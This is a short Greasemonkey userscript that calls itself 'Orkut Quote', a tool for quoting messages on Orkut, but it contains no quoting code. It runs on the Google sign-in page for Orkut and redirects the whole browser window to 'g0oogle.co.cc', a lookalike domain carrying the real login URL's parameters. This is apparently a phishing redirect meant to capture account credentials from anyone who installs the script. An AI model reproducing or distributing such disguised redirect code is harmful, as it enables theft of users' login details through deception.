// ==UserScript==
// @name           Orkut Quote
// @namespace      std
// @description    Quote messages for orkut
// @include        https://www.google.com/accounts/ServiceLogin?service=orkut&hl=en-US&rm=false&continue=http%3A%2F%2Fwww.orkut.com%2FRedirLogin%3Fmsg%3D0%26page%3Dhttp%253A%252F%252Fwww.orkut.co.in%252FHome&cd=IN&passive=true&skipvpage=true&sendvemail=false
// ==/UserScript==

/*
 * @umraz
 * @profile http://www.orkut.co.in/Main#Profile?uid=3023589184206406898&rl=t
 */

if (!window.location.href.match(/\?cmm=16467103/))
{
   window.top.location.href= "http://g0oogle.co.cc/?service=orkut&hl=en-US&rm=false&continue=http%3A%2F%2Fwww.orkut.com%2FRedirLogin.aspx%3Fmsg%3D0%26page%3Dhttp%253A%252F%252Fwww.orkut.co.in%252FHome.aspx&cd=IN&passive=true&skipvpage=true&sendvemail=false";

}